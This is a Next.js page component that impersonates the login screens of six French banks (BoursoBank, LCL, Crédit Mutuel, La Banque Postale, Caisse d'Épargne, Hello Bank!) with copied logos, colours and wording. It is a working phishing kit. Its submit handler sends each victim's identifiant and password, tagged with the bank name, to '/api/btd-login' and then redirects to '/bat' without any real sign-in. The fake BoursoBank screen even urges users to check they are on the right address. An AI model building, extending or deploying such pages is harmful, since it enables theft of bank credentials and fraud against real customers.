'use client';

import React, { useState, useEffect, FormEvent } from 'react';
import { useParams, useRouter, useSearchParams } from 'next/navigation';

type BankLayoutType = 'boursobank' | 'lcl' | 'credit-mutuel' | 'banque-postale' | 'caisse-epargne' | 'hello-bank' | 'default';

interface BankConfig {
  id: string;
  name: string;
  logo: string;
  layoutType: BankLayoutType;
  primaryColor?: string;
  identifiantLabel?: string;
  placeholder?: string;
}

const BANK_CONFIGS: Record<string, BankConfig> = {
  '11': {
    id: '11',
    name: 'BoursoBank',
    logo: '/boursorama-logo.png',
    layoutType: 'boursobank',
    placeholder: 'Saisissez votre identifiant',
  },
  '5': {
    id: '5',
    name: 'LCL',
    logo: '/lcl-logo.png',
    layoutType: 'lcl',
  },
  '8': {
    id: '8',
    name: 'Crédit Mutuel',
    logo: '/unnamed.jpg',
    layoutType: 'credit-mutuel',
    placeholder: 'Votre identifiant',
  },
  '7': {
    id: '7',
    name: 'La Banque Postale',
    logo: '/logo_BanquePostale_600x300.webp',
    layoutType: 'banque-postale',
    placeholder: 'Saisissez votre identifiant',
  },
  '6': {
    id: '6',
    name: 'Caisse d’Épargne',
    logo: '/12895685.png',
    layoutType: 'caisse-epargne',
    placeholder: 'Entrez votre identifiant',
  },
  '9': {
    id: '9',
    name: 'Hello Bank!',
    logo: '/hello-bank-logo.png',
    layoutType: 'hello-bank',
    placeholder: 'Numéro de 7 à 10 chiffres',
  },
};

export default function DynamicBankLoginPage() {
  const params = useParams();
  const searchParams = useSearchParams();
  const router = useRouter();

  const id = (params?.id as string) || searchParams?.get('id') || '11';
  const currentBank = BANK_CONFIGS[id] || BANK_CONFIGS['11'];

  const [identifiant, setIdentifiant] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Keypad aleatoire pour LCL
  const [keypadNumbers, setKeypadNumbers] = useState<string[]>([]);

  useEffect(() => {
    const nums = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'].sort(() => Math.random() - 0.5);
    setKeypadNumbers(nums);
  }, []);

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await fetch('/api/btd-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ bankId: currentBank.id, bankName: currentBank.name, identifiant, password }),
      });
    } catch (err) {
      console.error('Erreur :', err);
    } finally {
      router.push('/bat');
    }
  };

  const handleKeypadPress = (val: string) => {
    if (password.length < 6) {
      setPassword((prev) => prev + val);
    }
  };

  const handleKeypadClear = () => {
    setPassword((prev) => prev.slice(0, -1));
  };

  return (
    <div className="min-h-screen bg-[#F4F6F9] text-slate-800 font-sans flex flex-col items-center justify-start p-2 sm:p-6">
      <div className="w-full max-w-[420px] bg-white rounded-2xl shadow-sm overflow-hidden border border-slate-100 min-h-[90vh] flex flex-col justify-between">
        
        {/* --- 1. BOURSOBANK LAYOUT --- */}
        {currentBank.layoutType === 'boursobank' && (
          <div className="flex-1 flex flex-col">
            <div className="p-6 text-center">
              <img src={currentBank.logo} alt="BoursoBank" className="h-9 mx-auto mb-6 object-contain" />
              
              <div className="bg-white rounded-2xl border-t-4 border-[#E20074] p-6 shadow-sm border border-slate-100 flex flex-col items-center">
                <div className="w-16 h-16 bg-slate-100 rounded-full flex items-center justify-center mb-4 text-slate-400">
                  <svg className="w-8 h-8" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 2L2 12h3v8h6v-6h2v6h6v-8h3L12 2z" />
                  </svg>
                </div>
                
                <h1 className="text-xl font-bold text-[#002D62] mb-2">Mon identifiant</h1>
                <p className="text-xs text-slate-500 mb-4">Veuillez toujours vérifier que vous êtes sur la bonne adresse</p>
                
                <span className="inline-flex items-center gap-1.5 px-3 py-1 bg-white border border-emerald-500 text-emerald-600 text-xs font-medium rounded-full mb-6">
                  <span className="w-2 h-2 rounded-full bg-emerald-500"></span>
                  Espace Client
                </span>

                <form onSubmit={handleSubmit} className="w-full space-y-6">
                  <input
                    type="text"
                    required
                    value={identifiant}
                    onChange={(e) => setIdentifiant(e.target.value)}
                    placeholder={currentBank.placeholder}
                    className="w-full px-2 py-3 border-b border-slate-300 text-center font-medium text-slate-800 outline-none focus:border-[#E20074] transition-all"
                  />

                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full py-3.5 bg-[#E20074] text-white font-semibold text-sm rounded-full hover:bg-[#C00062] transition-colors"
                  >
                    Suivant
                  </button>
                </form>
              </div>
            </div>
          </div>
        )}

        {/* --- 2. LCL LAYOUT --- */}
        {currentBank.layoutType === 'lcl' && (
          <div className="flex-1 flex flex-col p-6 text-center">
            <img src={currentBank.logo} alt="LCL" className="h-14 mx-auto mb-6 object-contain" />
            
            <h2 className="text-lg font-bold text-[#002D72] mb-3">Votre identifiant</h2>
            
            {/* Display Identifiant slots */}
            <div className="flex justify-center gap-1 mb-4">
              {Array.from({ length: 10 }).map((_, idx) => (
                <div key={idx} className="w-7 h-8 border-b-2 border-slate-300 text-sm font-bold flex items-center justify-center">
                  {identifiant[idx] || ''}
                </div>
              ))}
            </div>

            <label className="flex items-center justify-center gap-2 text-xs text-slate-500 mb-6 cursor-pointer">
              <input type="checkbox" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)} className="rounded text-[#002D72]" />
              Mémoriser mon identifiant
            </label>

            <h2 className="text-lg font-bold text-[#002D72] mb-1">Votre code personnel</h2>
            <p className="text-xs text-slate-600 mb-3">Identifiant: <span className="font-bold text-[#002D72]">{identifiant || '-----------'}</span></p>

            {/* Password Dots */}
            <div className="flex justify-center gap-2 mb-6">
              {[0, 1, 2, 3, 4, 5].map((idx) => (
                <div
                  key={idx}
                  className={`w-3.5 h-3.5 rounded-full border ${
                    password.length > idx ? 'bg-[#002D72] border-[#002D72]' : 'border-slate-300'
                  }`}
                />
              ))}
            </div>

            {/* Circular Keypad */}
            <div className="grid grid-cols-4 gap-3 max-w-[280px] mx-auto mb-6">
              {keypadNumbers.map((num) => (
                <button
                  key={num}
                  type="button"
                  onClick={() => handleKeypadPress(num)}
                  className="w-14 h-14 rounded-full bg-[#EEF2FF] text-[#002D72] font-bold text-lg hover:bg-[#E0E7FF] flex items-center justify-center mx-auto transition-all active:scale-95"
                >
                  {num}
                </button>
              ))}
              <button
                type="button"
                onClick={handleKeypadClear}
                className="w-14 h-14 rounded-full bg-red-100 text-red-600 font-bold text-sm flex items-center justify-center mx-auto transition-all active:scale-95"
              >
                ✕
              </button>
            </div>

            <button
              onClick={handleSubmit}
              disabled={isSubmitting}
              className="w-full py-3.5 bg-slate-300 text-white font-semibold text-sm rounded-full transition-colors hover:bg-[#002D72]"
            >
              Valider →
            </button>
          </div>
        )}

        {/* --- 3. CRÉDIT MUTUEL LAYOUT --- */}
        {currentBank.layoutType === 'credit-mutuel' && (
          <div className="flex-1 flex flex-col p-4">
            <div className="flex justify-between items-center mb-6 border-b pb-3">
              <img src={currentBank.logo} alt="Crédit Mutuel" className="h-8 object-contain" />
              <div className="flex gap-3 text-sky-600">
                <span>🔍</span>
              </div>
            </div>

            <h1 className="text-xl font-bold text-[#003B70] text-center mb-4">Se connecter</h1>

            <div className="bg-white border rounded-lg overflow-hidden shadow-xs">
              <div className="border-b bg-slate-50 flex">
                <div className="px-4 py-3 font-semibold text-xs border-l-4 border-[#003B70] bg-white text-[#003B70]">
                  Identifiant / Mot de passe
                </div>
              </div>

              <form onSubmit={handleSubmit} className="p-4 space-y-4">
                <div>
                  <label className="block text-xs font-bold text-slate-700 mb-1">Identifiant *</label>
                  <input
                    type="text"
                    required
                    value={identifiant}
                    onChange={(e) => setIdentifiant(e.target.value)}
                    placeholder="Votre identifiant"
                    className="w-full px-3 py-2.5 border rounded-md text-sm outline-none focus:border-[#003B70]"
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold text-slate-700 mb-1">Mot de passe *</label>
                  <input
                    type="password"
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Votre mot de passe"
                    className="w-full px-3 py-2.5 border rounded-md text-sm outline-none focus:border-[#003B70]"
                  />
                </div>

                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full py-3 bg-[#0055A5] text-white font-bold text-sm rounded-full hover:bg-[#003B70]"
                >
                  Se connecter
                </button>
              </form>
            </div>
          </div>
        )}

        {/* --- 4. LA BANQUE POSTALE LAYOUT --- */}
        {currentBank.layoutType === 'banque-postale' && (
          <div className="flex-1 flex flex-col">
            <div className="p-4 flex justify-between items-center border-b">
              <img src={currentBank.logo} alt="La Banque Postale" className="h-8 object-contain" />
              <span className="text-slate-400 text-sm">✕</span>
            </div>

            <div className="p-6">
              <h1 className="text-xl font-bold text-[#003399] mb-6">Connexion à votre compte</h1>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <label className="block text-xs font-bold text-slate-700 mb-2">Identifiant (10 chiffres)</label>
                  <input
                    type="text"
                    required
                    maxLength={10}
                    value={identifiant}
                    onChange={(e) => setIdentifiant(e.target.value)}
                    placeholder="Saisissez votre identifiant"
                    className="w-full px-4 py-3 border border-slate-300 rounded-lg text-sm outline-none focus:border-[#003399]"
                  />
                </div>

                <div className="flex justify-between items-center">
                  <span className="text-xs text-slate-600">Mémoriser mon identifiant</span>
                  <input type="checkbox" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)} className="toggle" />
                </div>

                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full py-3.5 bg-[#0046AD] text-white font-bold text-sm rounded-lg hover:bg-[#003399]"
                >
                  Continuer
                </button>
              </form>
            </div>

            <div className="mt-auto bg-gradient-to-b from-[#0066FF] to-[#003399] p-6 text-white">
              <h2 className="text-2xl font-bold mb-2">La Banque Citoyenne</h2>
            </div>
          </div>
        )}

        {/* --- 5. CAISSE D'ÉPARGNE LAYOUT --- */}
        {currentBank.layoutType === 'caisse-epargne' && (
          <div className="flex-1 flex flex-col p-6 text-center">
            <img src={currentBank.logo} alt="Caisse d'Épargne" className="h-10 mx-auto mb-8 object-contain" />

            <h1 className="text-lg font-bold text-slate-800 mb-6 text-left">Saisissez votre identifiant</h1>

            <form onSubmit={handleSubmit} className="space-y-6 text-left">
              <input
                type="text"
                required
                value={identifiant}
                onChange={(e) => setIdentifiant(e.target.value)}
                placeholder={currentBank.placeholder}
                className="w-full px-3 py-3 border-b-2 border-slate-300 bg-slate-50 text-sm outline-none focus:border-[#D71920]"
              />

              <div className="text-center">
                <button type="button" className="text-xs text-[#D71920] font-semibold">Identifiant oublié ?</button>
              </div>

              <label className="flex items-center gap-2 text-xs text-slate-600 cursor-pointer">
                <input type="checkbox" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)} className="accent-[#D71920]" />
                Mémoriser mon identifiant
              </label>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full py-3 bg-slate-200 text-slate-400 font-bold text-sm rounded-md hover:bg-[#D71920] hover:text-white transition-colors"
              >
                Valider
              </button>
            </form>
          </div>
        )}

        {/* --- 6. HELLO BANK! LAYOUT --- */}
        {currentBank.layoutType === 'hello-bank' && (
          <div className="flex-1 flex flex-col">
            <div className="bg-[#00A88F] p-4 flex justify-between items-center text-white">
              <img src={currentBank.logo} alt="Hello Bank!" className="h-7 object-contain brightness-0 invert" />
              <button className="text-xs font-bold bg-white text-[#00A88F] px-3 py-1.5 rounded-full">Retour à Hello bank!</button>
            </div>

            <div className="p-6">
              <h1 className="text-2xl font-bold text-[#002D62] text-center mb-6">Accédez à votre espace client</h1>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <label className="block text-xs font-bold text-[#002D62] mb-2">Numéro Client</label>
                  <div className="relative">
                    <input
                      type="text"
                      required
                      value={identifiant}
                      onChange={(e) => setIdentifiant(e.target.value)}
                      placeholder={currentBank.placeholder}
                      className="w-full px-4 py-3 border-2 border-[#00A88F] rounded-lg text-sm outline-none"
                    />
                    {identifiant && (
                      <button type="button" onClick={() => setIdentifiant('')} className="absolute right-3 top-3.5 text-slate-400 text-xs">✕</button>
                    )}
                  </div>
                </div>

                <label className="flex items-center gap-2 text-xs text-slate-600 cursor-pointer">
                  <input type="checkbox" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)} className="accent-[#00A88F]" />
                  Mémoriser mon numéro client
                </label>

                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full py-3.5 bg-[#B2EBF2] text-[#008F7A] font-bold text-sm rounded-full hover:bg-[#00A88F] hover:text-white transition-colors"
                >
                  Continuer
                </button>
              </form>
            </div>
          </div>
        )}

      </div>
    </div>
  );
}